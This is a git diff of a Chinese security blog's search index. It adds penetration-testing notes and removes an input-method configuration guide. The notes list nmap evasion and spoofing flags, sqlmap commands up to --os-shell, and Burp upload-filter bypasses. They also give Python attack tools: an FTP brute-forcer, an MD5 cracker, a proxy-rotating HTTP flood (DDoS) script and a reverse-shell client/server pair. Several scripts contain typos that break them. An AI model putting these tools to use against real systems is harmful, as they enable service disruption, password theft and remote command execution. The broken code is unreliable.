+    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
+<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
+<li>NMAP逃逸方案：<ol>
+<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
+<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
+<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
+<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
+<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
+<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
+<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
+</ol>
+</li>
+</ol>
+<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
+<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
+<li>Whois：<code>nmap --script whois [site]</code></li>
+<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
+</ol>
+<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
+<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
+<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
+</ol>
+<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
+<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
+<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
+<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
+</ol>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
+<li><code>sqlmap -u URL --tables</code></li>
+</ol>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
+<li>实质：使用了ASP一类的动态脚本实现</li>
+<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
+</ol>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
+<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
+<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
+<li>将URL分段</li>
+<li>使用<code>--cookie</code>进行连接</li>
+<li>设置<code>--level</code>等级2级以上</li>
+</ol>
+</li>
+</ol>
+<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
+<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
+<li>操作步骤：<ol>
+<li>方法一：<ol start="2">
+<li>获取表单信息进行分析：找出输入框对应参数变量</li>
+<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
+</ol>
+</li>
+<li>方法二：<ol>
+<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
+<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
+<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
+</ol>
+<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
+<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
+<li><code>--os-cmd=xxx</code></li>
+<li><code>--os-shell</code></li>
+</ol>
+<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
+<li>forwar</li>
+<li>drop：放弃当前数据</li>
+<li>intercept is on&#x2F;off：开关</li>
+<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
+<li>Params：GET请求、POST请求、Cookie参数</li>
+<li>Hex：显示Raw选项的16进制内容</li>
+</ol>
+<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
+<li>Action &gt;&gt; Send to Intruder</li>
+<li>Positions:<ol>
+<li>Add$：选中内容设置为变量</li>
+<li>Clean$：重置变量</li>
+<li>Auto$：自动选取变量</li>
+<li>Refresh</li>
+<li>Attack type:<ol>
+<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
+<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
+<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
+<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Payloads：设置payload模式，配置字典</li>
+<li>start attack：观察len长度，进行筛选</li>
+</ol>
+<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
+<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
+<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
+<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
+<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
+</ul>
+</li>
+</ol>
+<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
+<li>Comparer：自动高亮功能方便比较</li>
+</ol>
+<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
+<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
+<ol>
+<li>hashlib加密明文</li>
+<li>datatime计算程序运行时间</li>
+<li>sys获取输入的密文</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
+<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
+</li>
+<li><p>操作思路：</p>
+<ol>
+<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CC函数定义</p>
+<ol>
+<li>request.ProxyHandler()函数设置代理服务器</li>
+<li>build_opener()函数创建自定义Opener对象</li>
+<li>Install_opener()函数创建opener</li>
+<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行循环</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
+<li><p>服务端：</p>
+<ol>
+<li>导入socket模块</li>
+<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
+<li>通过一个while循环来接受并发送用户执行的命令</li>
+<li>将结果接收回来并打印</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端</p>
+<ol>
+<li>使用subprocess执行获得的用户命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1176,51 +1176,180 @@
       </tags>
   </entry>
   <entry>
-    <title>RIME CONFIG GUIDE</title>
-    <url>/2021/12/25/RIME-CONfIG/</url>
-    <content><![CDATA[<h1 id="x2F-rime-x2F-build-x2F-ibus-rime-yaml"><a href="#x2F-rime-x2F-build-x2F-ibus-rime-yaml" class="headerlink" title="&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml"></a>&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml</h1><p>ibus-rime候选横竖列文件</p>
-<h1 id="x2F-rime-x2F-default-custom-yaml"><a href="#x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;rime&#x2F;default.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;menu/page_size&quot;</span>: <span class="number">7</span> <span class="comment">#每页候选词个数</span></span><br><span class="line">	<span class="string">&quot;ascii_composer/switch_key/Shift_L&quot;</span>: commit_code <span class="comment">#左shift提交字母</span></span><br><span class="line">	<span class="string">&quot;style/horizontal&quot;</span>: true      <span class="comment"># 候選橫排</span></span><br></pre></td></tr></table></figure>
-<h1 id="x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	switches:                   <span class="comment"># 注意縮進</span></span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: <span class="number">0</span>                <span class="comment"># reset 0 的作用是當從其他輸入方案切換到本方案時，</span></span><br><span class="line">	states: [ 中文, 西文 ]  <span class="comment"># 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span></span><br><span class="line">	- name: full_shape        <span class="comment"># 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span></span><br><span class="line">	states: [ 半角, 全角 ]  <span class="comment"># 而全／半角則可沿用之前方案中的用法。</span></span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: <span class="number">1</span>                <span class="comment"># 增加這一行：默認啓用「繁→簡」轉換。</span></span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure>
-<h1 id="weasel-custom-yaml"><a href="#weasel-custom-yaml" class="headerlink" title="weasel.custom.yaml"></a>weasel.custom.yaml</h1><h2 id="P站配色主题风格"><a href="#P站配色主题风格" class="headerlink" title="P站配色主题风格"></a>P站配色主题风格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line"><span class="comment"># rime输入法自定义P站配色风格主题</span></span><br><span class="line">	<span class="string">&quot;style/layout/round_corner&quot;</span>:<span class="number">5</span></span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>::p</span><br><span class="line">	  <span class="string">&quot;style/horizontal&quot;</span>: true  <span class="comment">#横向排列</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/:p&quot;</span>:</span><br><span class="line">		author:BLACK</span><br><span class="line">		name::p</span><br><span class="line">		back_color:<span class="number">0x000000</span></span><br><span class="line">		label_color:<span class="number">0xffffff</span></span><br><span class="line">		border_color:<span class="number">0x000000</span></span><br><span class="line">		text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_back_color:<span class="number">0x009bff</span></span><br><span class="line">		candidate_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_candidate_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_candidate_back_color:<span class="number">0x009bff</span></span><br><span class="line">		comment_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_lable_color:<span class="number">0x000000</span></span><br></pre></td></tr></table></figure>
-<pre><code>• 输入法代号：ibus-rime
-• 用户资料夹： ~/.config/ibus/rime/
-• 共享资料夹： /usr/share/rime-data/
-</code></pre>
-<p>共享资料夹包含预设输入方案的源文件。 这些文件属于 Rime 所发行软件的一部份，在访问权限控制较严格的系统上对用户是只读的，因此谢绝软件版本更新以外的任何修改—— 一旦用户修改这里的文件，很可能影响后续的软件升级或在升级时丢失数据。<br>在「部署 Rime」操作时，将用到这里的输入方案源文件、并结合用户定制的内容来编译预设输入方案。</p>
-<h1 id="「用户资料夹」数据说明"><a href="#「用户资料夹」数据说明" class="headerlink" title="「用户资料夹」数据说明"></a>「用户资料夹」数据说明</h1><h2 id="用户资料夹则包含为用户准备的内容"><a href="#用户资料夹则包含为用户准备的内容" class="headerlink" title="用户资料夹则包含为用户准备的内容"></a>用户资料夹则包含为用户准备的内容</h2><pre><code>• 〔全局設定〕 default.yaml
-• 〔發行版設定〕 ibus-rime.yaml
-• 〔預設輸入方案副本〕 &lt;方案标识&gt;.schema.yaml ibus-rime.schema.yaml
-• ※〔安裝信息〕 installation.yaml
-• ※〔用戶狀態信息〕 user.yaml
-</code></pre>
-<h2 id="编译输入方案所产出的二进制文件："><a href="#编译输入方案所产出的二进制文件：" class="headerlink" title="编译输入方案所产出的二进制文件："></a>编译输入方案所产出的二进制文件：</h2><pre><code>• 〔Rime 棱鏡〕 &lt;方案标识&gt;.prism.bin
-• 〔Rime 固態詞典〕 &lt;词典名&gt;.table.bin
-• 〔Rime 反查詞典〕 &lt;词典名&gt;.reverse.bin
-</code></pre>
-<h2 id="记录用户写作习惯的文件"><a href="#记录用户写作习惯的文件" class="headerlink" title="记录用户写作习惯的文件"></a>记录用户写作习惯的文件</h2><pre><code>• ※〔用戶詞典〕 &lt;词典名&gt;.userdb.kct
-• ※〔用戶詞典快照〕 &lt;词典名&gt;.userdb.txt、&lt;词典名&gt;.userdb.kct.snapshot 見於同步文件夾
-</code></pre>
-<h2 id="用户自己设定的"><a href="#用户自己设定的" class="headerlink" title="用户自己设定的"></a>用户自己设定的</h2><pre><code>• ※〔用戶對全局設定的定製信息〕 default.custom.yaml
-• ※〔用戶對預設輸入方案的定製信息〕 &lt;方案标识&gt;.custom.yaml
-• ※〔用戶自製輸入方案〕及配套的詞典源文件
-</code></pre>
-<p>注：以上标有 ※ 号的文件，包含用户资料，清理文件时要注意备份！</p>
-<h1 id="词库管理"><a href="#词库管理" class="headerlink" title="词库管理"></a>词库管理</h1><ol>
-<li>导入搜狗词库：<ol>
-<li>luna_pinyinn.sogou.dict.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rime dictionary</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">---</span><br><span class="line">name: luna_pinyin.sogou</span><br><span class="line">version: <span class="string">&quot;2015.12.24&quot;</span></span><br><span class="line">sort: by_weight</span><br><span class="line">use_preset_vocabulary: true</span><br><span class="line">import_tables:</span><br><span class="line">  - luna_pinyin</span><br><span class="line">...</span><br><span class="line"><span class="comment">#######后面为词库内容#########</span></span><br></pre></td></tr></table></figure></li>
-<li>luna_pinyin_simp.custom.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">translator/dictionary: luna_pinyin.sogou  <span class="comment">#导入搜狗词库</span></span><br></pre></td></tr></table></figure></li>
+    <title>ODAY-软件漏洞分析</title>
+    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
+<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
+<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
+<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
+<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
+<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
+<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
+<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
+<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
+</ul>
+</li>
+<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
+<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
+<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
+<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
+<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
+<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
+<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
+<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
+<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
+<li><a href="#gs">GS</a></li>
+<li><a href="#safeseh">SafeSEH</a></li>
+<li><a href="#dep">DEP</a></li>
+<li><a href="#aslr">ASLR</a></li>
+<li><a href="#sehop">SEHOP</a></li>
+<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
+<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
+</ul>
+<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
+<li>BUG：功能性逻辑缺陷</li>
+<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
+<li>0day响应：<ol>
+<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
+<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
